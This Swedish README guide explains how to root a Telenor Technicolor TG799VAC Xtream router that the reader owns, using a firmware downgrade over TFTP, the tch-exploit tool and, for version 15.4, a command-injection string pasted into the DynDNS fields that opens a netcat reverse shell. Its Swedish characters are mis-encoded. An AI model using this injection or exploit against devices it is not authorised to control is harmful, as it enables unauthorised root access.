# Root Technicolor TG799VAC-Xtream Telenor

Guide till Root Telenor TG799VAC Xtream > 18.1

Ska f�rs�ka g�ra guiden s� l�tt som m�jlig men lite f�rkunskaper kr�vs. 

## Varf�r root?

Du vill inte ha n�gra bakd�rrar i din router.
Du vill kunna g�ra inst�llningar som inte annars g�r pga minimal "hemsida"

## Under konstruktion!

Skriver eftersom hur man g�r.

## Start

**Detta �r f�r version > 18.1**


Om du ska kunna roota routern m�ste vi l�gga in en �ldre programvara. **17.1** 

## Setup TFTP

Du kan v�lja mellan t.ex:

K�r du https://github.com/BoLaMN/tch-exploit/releases beh�vs bara det programmet b�de f�r TFTP och root.

sudo ./tch-exploit-linux --ip="192.168.0.2 (din dators ipadress)" --tftp='s�kv�g till RBI'

eller

sudo ./tch-exploit-linux --eth="en0"--tftp='s�kv�g vill RBI'



F�rst ladda ner TFTP s� vi kan �verf�ra programvaran.
Download https://bitbucket.org/phjounin/tftpd64/downloads/Tftpd64-4.64-setup.exe

Mjukvara: https://github.com/Vargaskri/Root-Technicolor-TG799VAC-Xtream-Telenor/blob/master/RBI/TN_SWE_TG799vacXtream_17.1.7937-1281014-20180313133921-Official.rbi.torrent

L�gg filen i rooten i TFTP mappen.

K�r TFTP som Administrat�r. �ndra inst�llninar som bilderna visar. TFTP kan ibland vara br�kig men b�r g� bra. 

![T F T P Settings](images/TFTPSettings.png)

![T F T P Settings2](images/TFTPSettings2.png)

1. Ha routern avslagen.
1. S�tt in en n�tverkskabel i port 1 p� routern och i dator.
1. Ta ett gem eller n�t att h�lla in resetknappen med medans du sl�r ig�ng routern. H�ll in gemet tills ethernetlampan b�rjar blinka.
1. Nu borde TFTP f�re �ver mjukvaran i routern om allt g�r som de ska.
1. L�t routern f� starta upp, logga in och kolla om du har version **17.1**
    1. Om du har det forts�tt **h�r**
    1. Om **INTE** m�ste vi byta bootad bank.


## Byta bootad bank!

S�h�r byter jag mellan bank_1 och 2.  
Starta ett tidtagarur p� datorn eller mobil.
1. Sl� p� routern och tidtagaruret. 
2. Efter 30 sekunder tryck snabbt p� str�mknappen (av, p�) Om du gjorde r�tt kommer alla lampor p� routern lysa upp lite svagt sen startar routern om.
3. Starta om tidtagaruret och efter 30 sekunder sl� av och routern fort igen. G�r samma sak en g�ng till d�refter l�t routern starta upp. D� b�r du ha bootat **17.1**


## Sj�lva root delen.

Nu n�r du har 17.1 skall du anv�nda:

https://github.com/BoLaMN/tch-exploit/releases

N�tverkskabel ska in i WAN(r�da porten) p� routern. Och routern m�ste nollst�llas ifall den blivit anv�nd p� internet.

Under Linux:

./tch-exploit-linux

![TCH-Exploit](images/tch1.png)

F�lj instruktionerna och byt IP till det som st�r.
Efter en stund kommer det en massa text d� f�r routern ett IP nummer. En stund senare kommer �nnu mera text och va d� beredd p� att trycka
p� **WPS knappen** n�r det st�r att du ska g�ra det. 
Sen �r det bara att flytta n�tverkskabeln till LAN p� routern och logga in med SSH med anv�ndare "root" l�senord "root"


Under Windows:

�ppna en kommandotolk som Administrat�r.

G� till mappen d�r ni lagt filerna.

K�r tch-exploit-win.exe

## Version 15.4

Du beh�ver installera netcat p� windows ifall du inte k�r linux.

I en terminal skriv **nc -lvvp "port"**
 
Logga in p� routern g� till DynDNS:
Klistra in detta p� Domain,user,password sl� p� DynDNS och spara.
**::::::'nc "Din dators IP" "porten du angav i terminalen" -e /bin/sh'**

I din termninal kommer du nu f� ett skal.
